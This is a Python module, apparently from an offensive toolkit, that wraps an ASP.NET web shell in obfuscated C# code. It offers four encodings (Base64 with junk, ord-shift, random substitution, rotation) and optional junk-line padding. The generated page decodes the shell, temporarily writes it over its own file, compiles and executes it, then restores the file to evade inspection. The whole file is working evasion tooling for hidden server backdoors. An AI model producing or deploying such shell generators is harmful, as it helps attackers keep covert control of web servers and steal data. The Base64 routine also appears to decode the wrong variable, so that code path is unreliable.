#! /usr/bin/python

from shell import Shell  
from util import Encoders, Junk, AspxParser 


class Aspx(Shell): 
	
	def __init__(self, path = None):
		Shell.__init__(self, 'aspx')
		self.shell_path = self.Path.aspx if path == None else path
		self.shell_text = self.Read(self.shell_path)
	
	def Encode(self, encoding): 
		if encoding == 'b64' : return self.Base64()
		if encoding == 'ord' : return self.OrdPlus()
		if encoding == 'rnd' : return self.Random()
		if encoding == 'rot' : return self.RotPlus()
	
	def Create(self, payload, add_junk = False): 
		head  = '<%@ Page Language="C#" Debug="true" %> \n' 
		head += '<%@ Import namespace="System.IO" %> \n'
		head += '<%@ Import namespace="System.Web.Compilation" %> \n' 
		
		body = 'string ' + self.vars[0] + ' = Request.PhysicalPath; \n' 
		body += 'string ' + self.vars[1] + ' = "~/" + Request.FilePath; \n' 
		body += 'string ' + self.vars[2] + ' = File.ReadAllText(' + self.vars[0] + '); \n' 
		body += payload 
		body += 'File.WriteAllText(' + self.vars[0] + ', ' + self.vars[-1] + '); \n' 
		body += 'Page ' + self.vars[3] + ' = (Page)BuildManager.CreateInstanceFromVirtualPath(' + self.vars[1] + ', typeof(Page)); \n' 
		body += 'File.WriteAllText(' + self.vars[0] + ', ' + self.vars[2] + '); \n' 
		body += self.vars[3] + '.ProcessRequest(HttpContext.Current); \n' 
		
		if add_junk : 
			body = ''.join([ 
				line + ' \n' + Junk().Aspx([ self.makeVars() for _ in range(4) ])[self.rndInt(1, 4)] + ' \n' 
				for line in body.split(' \n') if line != '' 
			])
		return head + '<% \n' + body + '%> '
	
	def Base64(self): 
		shell_encoded = Encoders(self.shell_text).Base64()
		junk = self.makeJunk(shell_encoded, self.an_chars) 
		vals = self.makeVals(shell_encoded, junk)
		self.vars += [ self.makeVars() for _ in range(6) ]
		
		payload = 'string ' + self.vars[4] + ' = ""; \n' 
		payload += ''.join([ self.vars[4] + ' += "' + vals[i] + '"; \n' for i in range(len(vals)) ]) 
		payload += 'string ' + self.vars[5] + ' = Encoding.UTF8.GetString('
		payload += 'Convert.FromBase64String(' + self.vars[1] + '.Replace(@"' + junk + '", ""))); \n' 
		return payload
	
	def OrdPlus(self): 
		shell_encoded, ord_plus, chr_join = Encoders(self.shell_text).OrdPlus()
		vals = self.makeVals(shell_encoded)
		self.vars = [ self.makeVars() for _ in range(7) ]
		
		payload = 'string ' + self.vars[6] + ' = ""; \n'
		payload += 'string ' + self.vars[4] + ' = ""; \n' 
		payload += ''.join([ self.vars[4] + ' += "' + vals[i] + '"; \n' for i in range(len(vals)) ]) 
		payload += 'foreach(string ' + self.vars[5] + ' in ' + self.vars[4] + '.Split(\'' + chr_join + '\')) { ' 
		payload += self.vars[6] + ' += (char)(Convert.ToInt32(' + self.vars[5] + ') - ' + str(ord_plus) + '); } \n' 
		return payload
	
	def Random(self): 
		clean_str = lambda s : s.encode('unicode-escape').replace('"', '\\"') 
		shell_encoded, cs1, cs2 = Encoders(self.shell_text).Random()
		vals = self.makeVals(shell_encoded)
		self.vars = [ self.makeVars() for _ in range(8) ]
		
		payload = 'string ' + self.vars[7] + ' = ""; \n' 
		payload += 'string ' + self.vars[4] + ' = "' + clean_str(cs1) + '"; \n' 
		payload += 'string ' + self.vars[6] + ' = "' + clean_str(cs2) + '"; \n' 
		payload += 'string ' + self.vars[5] + ' = ""; \n' 
		payload += ''.join([ self.vars[5] + ' += "' + clean_str(vals[i]) + '"; \n' for i in range(len(vals)) ]) 
		payload += 'foreach(char c in ' + self.vars[5] + ') { ' 
		payload += self.vars[7] + ' += ' + self.vars[6] + '.Contains(c.ToString()) ? ' 
		payload += self.vars[4] + '[' + self.vars[6] + '.IndexOf(c)] : c; } \n' 
		return payload
	
	def RotPlus(self): 
		clean_str = lambda s : s.encode('unicode-escape').replace('"', '\\"') 
		shell_encoded, rows = Encoders(self.shell_text).Rot90()
		vals = self.makeVals(shell_encoded)
		self.vars = [ self.makeVars() for _ in range(8) ]
		
		payload = 'int ' + self.vars[5] + ' = ' + str(rows) + '; \n' 
		payload += 'string[] ' + self.vars[6] + ' = new string[' + str(rows) + ']; \n' 
		payload += 'string ' + self.vars[4] + ' = "" ; \n' 
		payload += ''.join([ self.vars[4] + ' += "' + clean_str(vals[i]) + '"; \n' for i in range(len(vals)) ]) 
		payload += 'for(int i = 0; i < ' + self.vars[4] + '.Length / ' + self.vars[5] + '; i++) '
		payload += '{ for(int r = 0; r < ' + self.vars[5] + '; r++) ' 
		payload += self.vars[6] + '[r] += ' + self.vars[4] + '[r + i * ' + self.vars[5] + ']; } \n'
		payload += 'string ' + self.vars[7] + ' = String.Join("", ' + self.vars[6] + ').Trim(); \n' 
		return payload

